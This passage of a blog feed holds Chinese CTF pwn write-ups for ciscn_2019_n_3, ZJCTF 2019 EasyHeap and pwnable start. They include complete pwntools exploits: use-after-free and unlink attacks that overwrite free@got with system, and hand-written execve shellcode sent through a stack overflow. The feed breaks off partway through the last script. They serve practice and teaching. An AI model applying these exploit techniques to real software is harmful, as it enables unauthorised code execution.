fa-arrow-up-right-from-square fa-sm"></i></a></p></li><li><p>其实还有一种情况(我也不知道算不算)，我修改了libc.so文件就过了</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ciscn_2019_n_3-uaf</title>
      <link href="/2024/09/02/ciscn-2019-n-3-uaf/"/>
      <url>/2024/09/02/ciscn-2019-n-3-uaf/</url>
      
        <content type="html"><![CDATA[<h1 id="ciscn-2019-n-3-32位uaf"><a href="#ciscn-2019-n-3-32位uaf" class="headerlink" title="ciscn_2019_n_3(32位uaf)"></a>ciscn_2019_n_3(32位uaf)</h1><p><font size="4"><a class="link" href="https://buuoj.cn/challenges#ciscn_2019_n_3">题目链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></font></p><h2 id="1-题目分析"><a href="#1-题目分析" class="headerlink" title="1.题目分析"></a>1.题目分析</h2><p><img lazyload src="/images/loading.svg" data-src="/ciscn-2019-n-3-uaf/capture_20240902124827761.bmp"></p><ul><li>又是典型的堆菜单题目，但是注意此题是32位的，接着看各个功能块：</li></ul><p><font size="4"><strong>do_new</strong></font></p><p><img lazyload src="/images/loading.svg" data-src="/ciscn-2019-n-3-uaf/capture_20240902124929281.bmp"></p><p><font size="4"><strong>do_del</strong></font></p><p><img lazyload src="/images/loading.svg" data-src="/ciscn-2019-n-3-uaf/capture_20240902124936477.bmp"></p><p><font size="4"><strong>do_dump</strong></font></p><p><img lazyload src="/images/loading.svg" data-src="/ciscn-2019-n-3-uaf/capture_20240902124944351.bmp"></p><p><font size="4"><strong>ask</strong></font></p><p><img lazyload src="/images/loading.svg" data-src="/ciscn-2019-n-3-uaf/capture_20240902124950987.bmp"></p><h3 id="1-1功能块分析"><a href="#1-1功能块分析" class="headerlink" title="1.1功能块分析"></a>1.1功能块分析</h3><ul><li>do_new里面是生成两个chunk(type&#x3D;2)，注意其中第一个chunk，malloc(0xc)，<strong>对于32位来说，他是0x8+0x4，这样malloc的chunk涉及到了prev_size的复用</strong>，下一个chunk的prev_size将会充当上一个chunk的user_data部分，因为prev_size记录上一个chunk是否被利用，没利用记作0，空着不用太浪费了就会被利用，**对应于64位，malloc(0xn0 + 0x8)**。</li><li>prev_size的复用通常会用于off_by_one漏洞利用，但这里没有off_by_one</li><li>do_new中的chunk结构如下：</li></ul><p><img lazyload src="/images/loading.svg" data-src="/ciscn-2019-n-3-uaf/heap.drawio.png"></p><p><font size="4" color="red">漏洞点就在rec_int_free和do_del里面：</font></p><p><img lazyload src="/images/loading.svg" data-src="/ciscn-2019-n-3-uaf/capture_20240902130932374.bmp"></p><p><em><em>do_del以地址执行函数，</em>(record[i]+4)对应的就是rec_int_free函数，record[i]就是指针参数。</em>*</p><ul><li>思路应该很清晰了,和之前一样的，修改free_got -&gt; system_plt，然后往record[i]传入&#x2F;bin&#x2F;sh\x00，进行do_del,就可以getshell，但是此题有点区别，<strong>由于是32位，&#x2F;bin&#x2F;sh\x00有8字节，一个机器字长无法写下，其实这里写入sh\x00\x00也可以getshell。</strong></li><li>如何修改，这里利用了<font color="red"><strong>uaf。</strong></font></li></ul><h2 id="2-gdb调试"><a href="#2-gdb调试" class="headerlink" title="2.gdb调试"></a>2.gdb调试</h2><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">add</span>(<span class="number">0</span>,<span class="number">2</span>,<span class="number">0x10</span>,b<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"><span class="title function_">add</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">0x10</span>,b<span class="string">&#x27;bbbb&#x27;</span>)</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/ciscn-2019-n-3-uaf/capture_20240902131659259.bmp"></p><ul><li><strong>查看堆布局可以明显看出prev_size的复用</strong></li></ul><h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><ul><li>接着我们free掉0，1，那么这四个chunk都会被free掉，进入fastbins中，然而，free之后它们的指针并未清零，这里就造成了uaf漏洞</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># free指针不清零,record[idx]依然有数值</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fastbins 0x10 1-&gt;0</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">2</span>,<span class="number">0xc</span>,<span class="string">b&#x27;sh\x00\x00&#x27;</span>+p32(system_plt))</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/ciscn-2019-n-3-uaf/capture_20240902132413024.bmp"></p><ul><li>我们再次malloc，首先就会malloc(0xc)，将record[1]malloc(0xc)给拿走，我们的目的就是修改record处的地址，<strong>那么我们再次malloc(0xc)，系统会将record[0]malloc(0xc)给你，那么我们修改这部分的内容了</strong></li></ul><p><img lazyload src="/images/loading.svg" data-src="/ciscn-2019-n-3-uaf/capture_20240902132856868.bmp"></p><ul><li><font size="4" color="red">下图可以发现record[0]发生了改变</font></li></ul><p><img lazyload src="/images/loading.svg" data-src="/ciscn-2019-n-3-uaf/capture_20240902132909502.bmp"></p><h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><ul><li>此时我们free(0)就可以getshell了</li></ul><h2 id="3-最终EXP"><a href="#3-最终EXP" class="headerlink" title="3.最终EXP"></a>3.最终EXP</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node5.buuoj.cn&quot;,27447)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,<span class="built_in">type</span>,size,content</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index &gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Type &gt; &quot;</span>,<span class="built_in">str</span>(<span class="built_in">type</span>) )</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == <span class="number">2</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;Length &gt; &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;Value &gt; &quot;</span>,content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;Value &gt; &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index &gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index &gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 思路uaf,double_free修改free_got -&gt; system_plt</span></span><br><span class="line"><span class="comment"># 注意32位</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">2</span>,<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">2</span>,<span class="number">0x10</span>,<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">bug()</span><br><span class="line"></span><br><span class="line"><span class="comment"># free指针不清零,record[idx]依然有数值</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fastbins 0x10 1-&gt;0</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">2</span>,<span class="number">0xc</span>,<span class="string">b&#x27;sh\x00\x00&#x27;</span>+p32(system_plt))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ZJCTF_2019_EasyHeap-unlink</title>
      <link href="/2024/09/01/ZJCTF-2019-EasyHeap-unlink/"/>
      <url>/2024/09/01/ZJCTF-2019-EasyHeap-unlink/</url>
      
        <content type="html"><![CDATA[<h1 id="ZJCTF-2019-EasyHeap-unlink"><a href="#ZJCTF-2019-EasyHeap-unlink" class="headerlink" title="[ZJCTF_2019]EasyHeap-unlink"></a>[ZJCTF_2019]EasyHeap-unlink</h1><p><a class="link" href="https://buuoj.cn/challenges#[ZJCTF%202019]EasyHeap">题目链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="初次分析"><a href="#初次分析" class="headerlink" title="初次分析"></a>初次分析</h2><ul><li>刚开始ida一看，以为和之前的题目一样，就是简单的修改unsortedbin-&gt;bk，然后getflag</li><li>之前的题目讲解：[BUUCTF hitcontraining_magicheap–<a class="link" href="https://blog.csdn.net/zwb2603096342/article/details/140345550?spm=1001.2014.3001.5502">Unsorted_bin-＞bk修改]3-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240901201439897.bmp"></p><ul><li><font size="4"><strong>l33r是个后门函数</strong></font></li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240901202058454.bmp"></p><ul><li>正常打结果却显示：</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240901193853555.bmp"></p><ul><li><font size="4" color="red">所以被后门函数欺骗了！！！</font></li></ul><h2 id="正式分析"><a href="#正式分析" class="headerlink" title="正式分析"></a>正式分析</h2><p>各个功能块就不展示了，可以看开头的博客。</p><ul><li>给了后门函数不可以用，但是提供了systen函数，我们要做的就是往里面传参，与上一篇博客可以说很相似了，<font color="red">先传入&#x2F;bin&#x2F;sh,修改free_got为system_plt,执行free即可</font></li><li>那么如何修改free_got，为了实现这个功能，我们通常有double_free控制同一个chunk，但是这里free后将指针清零了，所以无疑是不可以的，那么我们可以采取unlink，关于unlink可以参考<a class="link" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unlink/#unlink_2">这篇文章 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li><li>此题的PIE也没有开，且具有heaparray地址：</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240901202849993.bmp"></p><p><font size="4">常规的：</font></p><ul><li><font size="4"><strong>fd -&gt;  heaparray-0x18</strong></font></li><li><font size="4"><strong>bk -&gt; heaparray-0x10</strong></font></li></ul><p><font size="4">还有修改谁的fd，bk跟着gdb调试理解吧</font></p><h2 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h2><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;aaaa&#x27;</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;bbbb&#x27;</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>) <span class="comment"># 2</span></span><br></pre></td></tr></table></figure></div><ul><li>先生成3个chunk，chunk2防止chunk1在free的时候与top_chunk合并，并且传入&#x2F;bin&#x2F;sh</li><li>此时的堆布局如下</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240901203630753.bmp"></p><h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><ul><li>unlink需要构造fake_chunk,然后uaf</li><li><strong>利用chunk0构造一个fake_chunk:</strong></li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 构造fake_chunk</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(heaparray-<span class="number">0x18</span>)+p64(heaparray-<span class="number">0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0x20</span>) + p64(<span class="number">0x90</span>) <span class="comment"># 伪造chunk0为free_chunk</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">free(<span class="number">1</span>) <span class="comment"># 0,1合并</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div><ul><li>此时堆布局如下，构造的fake_chunk和chunk1合并,红框部分地址应该是main_arena+0x58</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240901204855949.bmp"></p><ul><li><font size="4" color="red"><strong>查看heaparray</strong></font></li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240901205436677.bmp"></p><p><font size="4" color="red"><strong>可以很明显的发现，修改chunk0，就是修改heaparray-0x18的值！！</strong></font></p><h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><ul><li>两个地方都可以修改chunk0，那么就可以先填入free_got,然后修改成system_plt，再free(2)即可：</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(free_got)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,p64(system_plt))</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><ul><li><font size="4">第一次edit</font></li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240901210431840.bmp"></p><ul><li><font size="4">第二次edit,发现成功修改了</font></li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240901210501273.bmp"></p><p><font size="4" color>注意：</font></p><p>这里有点像非栈上格式化字符串漏洞一样了，先建立A -&gt; B -&gt;C的结构，然后修改A其实是修改C</p><h2 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a><strong>完整EXP</strong></h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node5.buuoj.cn&quot;,28478)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content of heap:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content of heap : &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改free_got -&gt; system_plt</span></span><br><span class="line">magic = <span class="number">0x6020C0</span> </span><br><span class="line">heaparray = <span class="number">0x6020E0</span></span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;aaaa&#x27;</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;bbbb&#x27;</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>) <span class="comment"># 2</span></span><br><span class="line">bug()</span><br><span class="line"><span class="comment"># 构造fake_chunk</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(heaparray-<span class="number">0x18</span>)+p64(heaparray-<span class="number">0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0x20</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">free(<span class="number">1</span>) <span class="comment"># 0,1合并</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(free_got)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,p64(system_plt))</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable系列</title>
      <link href="/2024/09/01/pwnable%E7%B3%BB%E5%88%97/"/>
      <url>/2024/09/01/pwnable%E7%B3%BB%E5%88%97/</url>
      
        <content type="html"><![CDATA[<h1 id="pwnable-start-32位"><a href="#pwnable-start-32位" class="headerlink" title="pwnable-start(32位)"></a>pwnable-start(32位)</h1><p><a class="link" href="https://buuoj.cn/challenges#pwnable_start">题目链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h4 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h4><p><font color="red"><strong>根据汇编看漏洞</strong></font></p><ul><li>直接看ida反汇编，发现看不懂：</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240901105731101.bmp"></p><ul><li>果断选择看汇编：</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240901105741003.bmp"></p><p><font size="4"><strong>根据汇编我们可以知道这里执行了两个函数：</strong></font></p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">write(<span class="number">1</span>,buf,<span class="number">0x14</span>)</span><br><span class="line">read(<span class="number">3</span>,buf,<span class="number">0x3c</span>)</span><br></pre></td></tr></table></figure></div><ul><li>注意到最下面的add esp,0x14，我们可以知道<strong>栈空间只有0x14的长度，但是我们可以输入0x3c的长度</strong>，所以我们可以栈溢出，这就是通过汇编看漏洞。</li><li>我们将ret_address改为栈地址，并将栈地址写入shellcode，那么就可以getshell，接下来看如何泄露栈地址，并且如何手写shellcode。</li></ul><h4 id="gdb分析："><a href="#gdb分析：" class="headerlink" title="gdb分析："></a><font color="red">gdb分析：</font></h4><h4 id="1-泄露栈地址"><a href="#1-泄露栈地址" class="headerlink" title="1.泄露栈地址"></a>1.泄露栈地址</h4><ul><li>目前只有read和write函数可以调用，那么我们覆盖read的返回地址为sys_write上面mov ecx,esp；也就是会再次执行writed，然后将esp的地址输出出来。</li><li>栈地址rbp距离rsp是0x14,再将泄露的地址加上0x14就是栈地址了。</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 泄漏栈地址</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;CTF:&quot;</span>)</span><br><span class="line">bug()</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x14</span> + p32(<span class="number">0x08048087</span>) <span class="comment"># 就是mov ecx,esp;的地址</span></span><br><span class="line">p.send(payload)</span><br><span class="line">stack = u32(p.recv(<span class="number">4</span>)) + <span class="number">0x14</span></span><br><span class="line">success(<span class="string">&#x27;stack:&#x27;</span>+<span class="built_in">hex</span>(stack))</span><br></pre></td></tr></table></figure></div><ul><li><font size="4">此时栈溢出修改ret_address</font></li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240901112556053.bmp"></p><ul><li><font size="4">泄露出栈地址：</font></li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240901112801146.bmp"></p><h4 id="2-手写shellcode"><a href="#2-手写shellcode" class="headerlink" title="2.手写shellcode"></a>2.手写shellcode</h4><ul><li>我们可以写入0x3c的数据，除了0x14的垃圾数据和覆盖返回地址，还可以写入0x3c-0x18&#x3D;0x24的内容，用<strong>pwntools自动生成的shellcode长度是0x2c，发现是过长了的,所以我们要自己手写shellcode。</strong></li><li><fron size="4" color="red">如何手写？</fron></li></ul><p><strong>shellcode其实就是执行execve(‘&#x2F;bin&#x2F;sh’,0,0)</strong></p><ul><li><p><font size="4">eax &#x3D; 0xb <a class="link" href="https://blog.csdn.net/winter2121/article/details/119845443?ops_request_misc=&request_id=&biz_id=102&utm_term=linux%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%8F%B732%E4%BD%8D&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-119845443.142%5Ev100%5Epc_search_result_base8&spm=1018.2226.3001.4187">32位的系统调用号 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>execve是0xb</font></p></li><li><p><font size="4">ebx &#x3D; &#x2F;bin&#x2F;sh\x00</font></p></li><li><p><font size="4">ecx &#x3D; 0</font></p></li><li><p><font size="4">edx &#x3D; 0</font></p></li><li><p><font size="4">int 0x80</font></p></li></ul><p><strong>各个寄存器的数值就是这样的，我们手写的shellcode就要满足这些就行了，注意&#x2F;bin&#x2F;sh的小端序就行了</strong></p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;<span class="string">&#x27;/bin/sh\x00&#x27;</span>[::-<span class="number">1</span>].encode(<span class="string">&#x27;utf-8&#x27;</span>).<span class="built_in">hex</span>()</span><br><span class="line"><span class="string">&#x27;0068732f6e69622f&#x27;</span></span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor ecx,ecx; # ecx=0</span></span><br><span class="line"><span class="string">xor edx,edx; # edx=0</span></span><br><span class="line"><span class="string">push edx;</span></span><br><span class="line"><span class="string">push 0x0068732f; # 将/bin/sh\x00入栈</span></span><br><span class="line"><span class="string">push 0x6e69622f;</span></span><br><span class="line"><span class="string">mov ebx,esp; # ebx = /bin/sh\x00</span></span><br><span class="line"><span class="string">mov eax,0xb; # execve 32位系统调用号</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(<span class="string">&#x27;xor ecx,ecx;xor edx,edx;push edx;push 0x0068732f;push 0x6e69622f;mov ebx,esp;mov eax,0xb;int 0x80;&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x14</span>) + p32(stack) + shellcode</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240901114138740.bmp"></p><ul><li>ok,执行了execve(‘&#x2F;bin&#x2F;sh‘，0，0)了，就getshell了</li></ul><h3 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 